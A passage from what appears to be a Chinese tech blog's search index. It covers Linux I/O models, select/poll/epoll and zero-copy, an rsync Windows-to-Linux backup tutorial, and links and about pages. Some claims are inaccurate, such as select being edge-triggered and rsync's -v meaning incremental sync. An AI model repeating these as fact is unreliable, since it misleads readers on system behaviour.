操作时可能会因为信号队列溢出导致没法通知。\n异步阻塞：程序进程向内核发送IO调用后，不用等待内核响应，可以继续接受其他请求，内核收到进程请求后进行的IO如果不能立即返回，就由内核等待结果，直到IO完成后内核再通知进程。 异步 I/O 模型（ asynchronous IO ） 异步I/O 与 信号驱动I/O最大区别在于，信号驱动是内核通知用户进程何时开始一个I/O操作，而异步I/O是由内核通知用户进程I/O操作何时完成，两者有本质区别在于异步IO相当于不用去饭店场吃饭，直接点个外卖，把等待上菜的时间也给省了。\n相对于同步I/O，异步I/O不是顺序执行。用户进程进行aio_read系统调用之后，无论内核数据是否准备好，都会直接返回给用户进程，然后用户态进程可以去做别的事情。等到socket数据准备好了，内核直接复制数据给进程，然后从内核向进程发送通知。IO两个阶段，进程都是非阻塞的。\n信号驱动IO当内核通知触发信号处理程序时，信号处理程序还需要阻塞在从内核空间缓冲区拷贝数据到用户空间缓冲区这个阶段，而异步IO直接是在第二个阶段完成后，内核直接通知用户线程可以进行后续操作了\n优点：异步 I/O 能够充分利用 DMA 特性，让 I/O 操作与计算重叠\n缺点：要实现真正的异步 I/O，操作系统需要做大量的工作。目前 Windows 下通过 IOCP 实现了真正的异步 I/O，在 Linux 系统下，Linux 2.6才引入，目前 AIO 并不完善，因此在 Linux 下实现高并发网络编程时以 IO 复用模型模式+多线程任务的架构基本可以满足需求\nLinux提供了AIO库函数实现异步，但是用的很少。目前有很多开源的异步IO库，例如libevent、libev、libuv。\n异步非阻塞：程序进程向内核发送IO调用后，不用等待内核响应，可以继续接受其他请求，内核调用的IO如果不能立即返回，内核会继续处理其他事物，直到IO完成后将结果通知给内核，内核在将IO完成的结果返回给进程，期间进程可以接受新的请求，内核也可以处理新的事物，因此相互不影响，可以实现较大的同时并实现较高的IO复用，因此异步非阻塞是使用最多的一种通信方式。 五种 IO 对比 这五种 I/O 模型中，越往后，阻塞越少，理论上效率也是最优前四种属于同步 I/O，因为其中真正的 I/O 操作(recvfrom)将阻塞进程/线程，只有异步 I/O 模型才与 POSIX 定义的异步 I/O 相匹配。\nI/O 的具体实现方式 I/O 常见实现 Nginx支持在多种不同的操作系统实现不同的事件驱动模型，但是其在不同的操作系统甚至是不同的系统版本上面的实现方式不尽相同，主要有以下实现方式：\n1、select： select库是在linux和windows平台都基本支持的 事件驱动模型库，并且在接口的定义也基本相同，只是部分参数的含义略有差异，最大并发限制1024，是最早期的事件驱动模型。 2、poll： 在Linux 的基本驱动模型，windows不支持此驱动模型，是select的升级版，取消了最大的并发限制，在编译nginx的时候可以使用--with-poll_module和--without-poll_module这两个指定是否编译select库。 3、epoll： epoll是库是Nginx服务器支持的最高性能的事件驱动库之一，是公认的非常优秀的事件驱动模型，它和select和poll有很大的区别，epoll是poll的升级版，但是与poll有很大的区别. epoll的处理方式是创建一个待处理的事件列表，然后把这个列表发给内核，返回的时候在去轮训检查这个表，以判断事件是否发生，epoll支持一个进程打开的最大事件描述符的上限是系统可以打开的文件的最大数，同时epoll库的I/O效率不随描述符数目增加而线性下降，因为它只会对内核上报的“活跃”的描述符进行操作。 4、kqueue： 用于支持BSD系列平台的高校事件驱动模型，主要用在FreeBSD 4.1及以上版本、OpenBSD 2.0级以上版本，NetBSD级以上版本及Mac OS X 平台上，该模型也是poll库的变种，因此和epoll没有本质上的区别，都是通过避免轮训操作提供效率。 5、Iocp： Windows系统上的实现方式，对应第5种（异步I/O）模型。 6、rtsig： 不是一个常用事件驱动，最大队列1024，不是很常用 7、/dev/poll: 用于支持unix衍生平台的高效事件驱动模型，主要在Solaris 平台、HP/UX，该模型是sun公司在开发Solaris系列平台的时候提出的用于完成事件驱动机制的方案，它使用了虚拟的/dev/poll设备，开发人员将要见识的文件描述符加入这个设备，然后通过ioctl()调用来获取事件通知，因此运行在以上系列平台的时候请使用/dev/poll事件驱动机制。 8、eventport： 该方案也是sun公司在开发Solaris的时候提出的事件驱动库，只是Solaris 10以上的版本，该驱动库看防止内核崩溃等情况的发生。 常用 I/O 模型比较 Select： POSIX所规定，目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点，本质上是通过设置或者检查存放fd标志位的数据结构来进行下一步处理。 缺点： 单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义FD_SETSIZE，再重新编译内核实现，但是这样也会造成效率的降低 单个进程可监视的fd数量被限制，默认是1024，修改此值需要重新编译内核 对socket是线性扫描，即采用轮询的方法，效率较低 select 采取了内存拷贝方法来实现内核将 FD 消息通知给用户空间，这样一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传递该结构时复制开销大 poll： 本质上和select没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态 其没有最大连接数的限制，原因是它是基于链表来存储的 大量的fd的数组被整体复制于用户态和内核地址空间之间，而不管这样的复制是不是有意义 poll特点是“水平触发”，如果报告了fd后，没有被处理，那么下次poll时会再次报告该fd select是边缘触发即只通知一次 epoll： 在Linux 2.6内核中提出的select和poll的增强版本 支持水平触发LT和边缘触发ET，最大的特点在于边缘触发，它只告诉进程哪些fd刚刚变为就绪态，并且只会通知一次 使用“事件”的就绪通知方式，通过epoll_ctl注册fd，一旦该fd就绪，内核就会采用类似callback的回调机制来激活该fd，epoll_wait便可以收到通知 优点: 没有最大并发连接的限制：能打开的FD的上限远大于1024(1G的内存能监听约10万个端口)，具体查看/proc/sys/fs/file-max，此值和系统内存大小相关 效率提升：非轮询的方式，不会随着FD数目的增加而效率下降;只有活跃可用的FD才会调用callback函数，即epoll最大的优点就在于它只管理“活跃”的连接，而跟连接总数无关 内存拷贝，利用mmap(Memory Mapping)加速与内核空间的消息传递;即epoll使用mmap减少复制开销 总结\n1、epoll只是一组API，比起select这种扫描全部的文件描述符，epoll只读取就绪的文件描述符，再加入基于事件的就绪通知机制，所以性能比较好 2、基于epoll的事件多路复用减少了进程间切换的次数，使得操作系统少做了相对于用户任务来说的无用功。 3、epoll比select等多路复用方式来说，减少了遍历循环及内存拷贝的工作量，因为活跃连接只占总并发连接的很小一部分。 范例：最大并发连接数和内存有直接关系\n#内存1G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 952Mi 168Mi 605Mi 12Mi 178Mi 629Mi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 92953 #内存2G [root@centos8 ~]#free -h total used free shared buff/cache available Mem: 1.9Gi 258Mi 1.3Gi 12Mi 341Mi 1.6Gi Swap: 2.0Gi 0B 2.0Gi [root@centos8 ~]#cat /proc/sys/fs/file-max 195920 范例：内核限制\n[root@centos8 ~]#grep -R FD_SETSIZE linux-5.8/* linux-5.8/Documentation/userspace-api/media/v4l/func-select.rst: ``FD_SETSIZE``. linux-5.8/include/uapi/linux/posix_types.h:#undef __FD_SETSIZE linux-5.8/include/uapi/linux/posix_types.h:#define __FD_SETSIZE 1024 #单个进程能够 监视的文件描述符的文件最大数量 linux-5.8/include/uapi/linux/posix_types.h: unsigned long fds_bits[__FD_SETSIZE / (8 * sizeof(long))]; linux-5.8/tools/include/nolibc/nolibc.h:#define FD_SETSIZE 256 linux-5.8/tools/include/nolibc/nolibc.h:typedef struct { uint32_t fd32[FD_SETSIZE/32]; } fd_set; linux-5.8/tools/include/nolibc/nolibc.h: if (fd \u0026lt; 0 || fd \u0026gt;= FD_SETSIZE) linux-5.8/tools/testing/selftests/net/nettest.c: rc = select(FD_SETSIZE, NULL, \u0026amp;wfd, NULL, tv); 范例：select 和 epoll 帮助\n[root@centos8 ~]#whatis epoll epoll (7) - I/O event notification facility [root@centos8 ~]#whatis select select (2) - synchronous I/O multiplexing select (3) - synchronous I/O multiplexing select (3p) - synchronous I/O multiplexing [root@centos8 ~]#whatis poll poll (2) - wait for some event on a file descriptor poll (3p) - input/output multiplexing [root@centos8 ~]#man 2 select SELECT(2) Linux Programmer\u0026#39;s Manual SELECT(2) NAME select, pselect, FD_CLR, FD_ISSET, FD_SET, FD_ZERO - synchronous I/O multiplexing [root@centos8 ~]#man 2 poll POLL(2) Linux Programmer\u0026#39;s Manual POLL(2) NAME poll, ppoll - wait for some event on a file descriptor 零拷贝 零拷贝介绍 传统 Linux 的I/O 问题 传统的 Linux 系统的标准 I/O 接口（read、write）是基于数据拷贝的，也就是数据都是 copy_to_user 或者 copy_from_user，这样做的好处是，通过中间缓存的机制，减少磁盘 I/O 的操作，但是坏处也很明显，大量数据的拷贝，用户态和内核态的频繁切换，会消耗大量的 CPU 资源，严重影响数据传输的性能，统计表明，在Linux协议栈中，数据包在内核态和用户态之间的拷贝所用的时间甚至占到了数据包整个处理流程时间的57.1%\n以上图为例，一次完整的网络请求涉及IO数据流向为：网络协议栈 \u0026ndash;\u0026gt; 内核空间 \u0026ndash;\u0026gt; 用户空间 \u0026ndash;\u0026gt; 内核空间 \u0026ndash; \u0026gt; 磁盘\u0026ndash; \u0026gt; 内核空间\u0026ndash; \u0026gt; 用户空间\u0026ndash; \u0026gt; 内核空间\u0026ndash; \u0026gt; 网络协议栈。可观察到一次IO过程，数据被拷贝了多次。\n什么是零拷贝 零拷贝就是上述问题的一个解决方案，通过尽量避免拷贝操作来缓解 CPU 的压力。零拷贝并没有真正做\n到“0”拷贝，它更多是一种思想，很多的零拷贝技术都是基于这个思想去做的优化\n零拷贝相关技术 MMAP ( Memory Mapping ) mmap()系统调用使得进程之间通过映射同一个普通文件实现共享内存。普通文件被映射到进程地址空间后，进程可以向访问普通内存一样对文件进行访问。\nmmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。\n实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。\n内存映射减少数据在用户空间和内核空间之间的拷贝操作,适合大量数据传输。\n以上图为例，网络请求到达内核空间（Socket缓存）后不再需要copy到用户空间，内存映射使得用户空间进程直接操作内核空间的数据，在处理完请求后，返回数据时也直接从内核空间（Kernerl缓存）拷贝到Socket缓存，再一次减少了内核空间与用户空间数据交换的过程。\n上面左图为传统读写,右图为MMAP.两者相比mmap要比普通的read系统调用少了一次copy的过程。因为read调用，进程是无法直接访问kernel space的，所以在read系统调用返回前，内核需要将数据从内核复制到进程指定的buffer。但mmap之后，进程可以直接访问mmap的数据(page cache)。\nSENDFIRL 实现效果与MMAP类似，减少了用户空间和内存空间的上下文切换（数据拷贝）\nDMA 辅助的 SENDFILE Kernel 到 Sockert 只需要传输文件描述符，而数据直接通过DMA拷贝到网络协议栈。\n","permalink":"https://senmer.github.io/zh/posts/tech/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/","summary":"\u003cp\u003e本节内容主要用于理解Linux的I/O模型，以便更好地理解Nginx架构。\u003c/p\u003e","title":"IO模型与零拷贝"},{"content":"利用rsync实现windows定时向linux同步数据（增量同步）\nwindows同步Linux数据 1、Linux安装rsync服务端\nyum -y install rsync 准备配置文件 vim /etc/rsyncd.conf uid = root gid = root use chroot = no max connections = 2 pid file = /var/run/rsyncd.pid exclude = lost+found/ transfer logging = yes timeout = 900 ignore nonreadable = yes dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2 [rsync] path = /data/mysql/backup hosts allow = 172.20.20.0/24 auth user = rsync secrets file = /etc/rsync.txt read only = yes #配置文件详解 [rsync] #是同步目录的一个别名，path对应实际数据所在路径 hosts.allow #哪个网络内的主机可访问该服务 secrets file #账户认证文件路径，该文件存放了自定义的用于同步的账号信息（格式为：账号：密码，多个账号写多行即可） read only = yes #表示客户端只能下载服务端的文件而不能上传(单向同步) 这应该是大部分业务的需求,如果有上传需要,设置read only = no 即可 #准备账号认证文件 vim /etc/rsync.txt chmod 600 /etc/rsync.txt #此步骤必须，否则客户端同步时会提示auth failed echo \u0026#34;rsync:passwd\u0026#34; \u0026gt; /etc/rsync.txt #启动服务 systemctl enable rsyncd --now 2、windows安装rsync客户端\n下载地址：https://itefix.net/dl/free-software/cwrsync_6.2.4_x64_free.zip 解压到指定目录后将bin目录的路径添加到path环境变量完成安装 3、windows客户端同步命令\nrsync --list-only rsync@172.20.20.20::rsync --password-file=/cygdrive/d/rsyncpwd.txt #查看服务端有哪些数据 rsync -av --delete rsync@172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt 注意：/cygdrive/d/mysql_backup/ #该写法表示路径(本地数据存放路径）：D:\\mysql_bakcup\\ 相关参数： --delete 表示删除本地tmpfolder目录中跟服务器test01下不一致的所有文件和目录 --password 指定存放了密码的文件路径（用于非交互式同步数据） -v 表示采用增量的方式同步文件 -a 是 archive mode; same as -rlptgoD; 相当于简写了很多参数 -u, --update 忽略客户端上(比服务端)更加新的文件 -r, --recursive 递归同步目录 -z, --compress 传输时压缩文件数据 4、windows设置计划任务，定时同步数据：\n脚本内容：\n@echo off rsync -av --delete 172.20.20.20::rsync /cygdrive/d/mysql_backup/ --password-file=/cygdrive/d/rsyncpwd.txt ","permalink":"https://senmer.github.io/zh/posts/tech/data_sync/windows%E5%90%91linux%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/","summary":"\u003cp\u003e利用rsync实现windows定时向linux同步数据（增量同步）\u003c/p\u003e","title":"windows向linux同步数据"},{"content":" WZ\u0026#39;s Blog 一个记录技术、阅读、生活的博客 名称： 花香蝶自来 网址： https://senmer.github.io 图标： https://senmer.github.io/img/Q.gif 描述： 一个记录技术、阅读、生活的博客 ","permalink":"https://senmer.github.io/zh/links/","summary":"WZ\u0026#39;s Blog 一个记录技术、阅读、生活的博客 名称： 花香蝶自来 网址： https://senmer.github.io 图标： https://senmer.github.io/img/Q.gif 描述： 一个记录技术、阅读、生活的博客","title":"🤝友链"},{"content":"关于我\n姓名: wz 职业: 运维 邮箱 hello_info@163.com ","permalink":"https://senmer.github.io/zh/about/","summary":"关于我 姓名: wz 职业: 运维 邮箱 hello_info@163.com","title":"🙋🏻‍♂️关于"}]